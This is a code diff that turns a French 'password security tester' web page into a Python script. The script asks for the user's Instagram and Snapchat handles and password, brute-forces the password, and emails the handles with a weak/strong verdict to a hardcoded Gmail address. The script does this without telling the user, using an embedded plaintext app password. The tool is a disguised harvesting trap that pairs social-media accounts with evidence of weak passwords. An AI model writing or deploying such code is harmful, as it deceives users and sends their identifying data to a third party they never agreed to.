@@ -1,56 +1,81 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-  <meta charset="UTF-8">
-  <title>Testeur de Sécurité de Mot de Passe</title>
-  <style>
-    body { font-family: Arial, sans-serif; padding: 2em; background: #f9f9f9; }
-    h1 { color: #333; }
-    .zone-test { margin-top: 2em; }
-    input[type="password"] { padding: 0.5em; width: 300px; }
-    button { padding: 0.5em 1em; margin-left: 1em; }
-    .resultat { margin-top: 1em; font-weight: bold; }
-  </style>
-</head>
-<body>
-  <h1>🔐 Bienvenue sur le Testeur de Sécurité de Mot de Passe</h1>
-  <p>Ce site vous permet de tester la robustesse de votre mot de passe en simulant une attaque par force brute. Si votre mot de passe est deviné en moins de <strong>10 secondes</strong>, il est considéré comme <strong>non sécurisé</strong>.</p>
+import itertools
+import string
+import time
+import smtplib
+from email.mime.text import MIMEText
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
-  <div class="zone-test">
-    <label for="motdepasse">Entrez votre mot de passe :</label><br><br>
-    <input type="password" id="motdepasse" placeholder="Votre mot de passe">
-    <button onclick="testerMotDePasse()">Tester</button>
-    <div class="resultat" id="resultat"></div>
-  </div>
+# 📬 Configuration SMTP Gmail
+DESTINATAIRE = "yamafly404@gmail.com"
+EXPEDITEUR = "yamafly404@gmail.com"
+MOT_DE_PASSE = "tdig nbky fome nukp"  # Mot de passe d'application Gmail
+SMTP_SERVEUR = "smtp.gmail.com"
+SMTP_PORT = 587
 
-  <script>
-    function testerMotDePasse() {
-      const mot = document.getElementById('motdepasse').value;
-      const resultat = document.getElementById('resultat');
-      if (!mot || mot.length < 4) {
-        resultat.textContent = '⛔ Veuillez entrer un mot de passe d\'au moins 4 caractères.';
-        return;
-      }
-      const tempsSimule = Math.random() * 15;
-      if (tempsSimule < 10) {
-        resultat.textContent = `⚠️ Mot de passe NON sécurisé (deviné en ${tempsSimule.toFixed(2)} secondes).`;
-      } else {
-        resultat.textContent = `🔒 Mot de passe sécurisé (deviné en ${tempsSimule.toFixed(2)} secondes).`;
-      }
-    }
-  </script>
-</body>
-</html>
+# 🔠 Alphabet utilisé pour générer les combinaisons
+caracteres = string.ascii_letters + string.digits + string.punctuation
 
-<div style="background:#f1f1f1; padding:20px; margin-top:40px; border-radius:8px; max-width:500px; margin:auto; box-shadow:0 0 10px rgba(0,0,0,0.05);">
-  <h3 style="color:#333; text-align:center;">📞 Besoin d'aide ?</h3>
-  <p style="text-align:center; font-size:16px;">Si vous avez des questions ou besoin d'assistance, vous pouvez me contacter directement :</p>
-  <p style="text-align:center; font-size:18px; font-weight:bold; color:#007BFF;">
-    📱 <a href="tel:+33749127131" style="text-decoration:none; color:#007BFF;">07 49 12 71 31</a>
-  </p>
-  <p style="text-align:center; font-size:16px; margin-top:10px;">
-    <a href="https://wa.me/33749127131" target="_blank" style="background:#25D366; color:#fff; padding:10px 15px; border-radius:5px; text-decoration:none;">
-      📩 Envoyer un message WhatsApp
-    </a>
-  </p>
-</div>
+# 🔍 Fonction de test de mot de passe
+def tester_combinaison(combinaison, mot):
+    tentative = ''.join(combinaison)
+    return tentative if tentative == mot else None
+
+# 📬 Fonction d'envoi de mail avec les pseudos et le résultat
+def envoyer_email(pseudo_instagram, pseudo_snap, resultat):
+    sujet = "Test de mot de passe - Résultat"
+    corps = f"""📸 Pseudo Instagram : {pseudo_instagram}
+👻 Pseudo Snap : {pseudo_snap}
+🔐 Résultat : {resultat}"""
+    msg = MIMEText(corps)
+    msg["Subject"] = sujet
+    msg["From"] = EXPEDITEUR
+    msg["To"] = DESTINATAIRE
+
+    try:
+        with smtplib.SMTP(SMTP_SERVEUR, SMTP_PORT) as serveur:
+            serveur.starttls()
+            serveur.login(EXPEDITEUR, MOT_DE_PASSE)
+            serveur.send_message(msg)
+            print("✅ Résultat envoyé par mail.")
+    except Exception as e:
+        print("❌ Erreur d'envoi :", e)
+
+# 🧪 Fonction principale de brute force
+def brute_force(mot, pseudo_instagram, pseudo_snap, max_length=6):
+    debut = time.time()
+    trouve = False
+
+    print("\n🔍 Test en cours...")
+
+    with ThreadPoolExecutor() as executor:
+        for longueur in range(1, max_length + 1):
+            combinaisons = itertools.product(caracteres, repeat=longueur)
+            futures = {executor.submit(tester_combinaison, c, mot): c for c in combinaisons}
+
+            for future in as_completed(futures):
+                resultat = future.result()
+                if resultat:
+                    fin = time.time()
+                    temps = round(fin - debut, 2)
+                    statut = "NON sécurisé" if temps < 10 else "sécurisé"
+                    print(f"\n✅ Mot de passe trouvé : {resultat}")
+                    print(f"⏱️ Temps écoulé : {temps} secondes")
+                    print(f"🔐 Résultat : {statut}")
+
+                    envoyer_email(pseudo_instagram, pseudo_snap, f"{statut} ({temps}s)")
+                    trouve = True
+                    break
+            if trouve:
+                break
+
+    if not trouve:
+        print("\n🔒 Mot de passe non trouvé dans la limite de recherche.")
+        envoyer_email(pseudo_instagram, pseudo_snap, "Mot de passe non trouvé")
+
+# 🚀 Lancement du test
+if __name__ == "__main__":
+    print("🔐 Bienvenue sur le Testeur de Sécurité de Mot de Passe\n")
+    pseudo_instagram = input("📸 Entrez votre pseudo Instagram : ")
+    pseudo_snap = input("👻 Entrez votre pseudo Snap : ")
+    mot = input("🔑 Entrez votre mot de passe à tester : ")
+    brute_force(mot, pseudo_instagram, pseudo_snap)
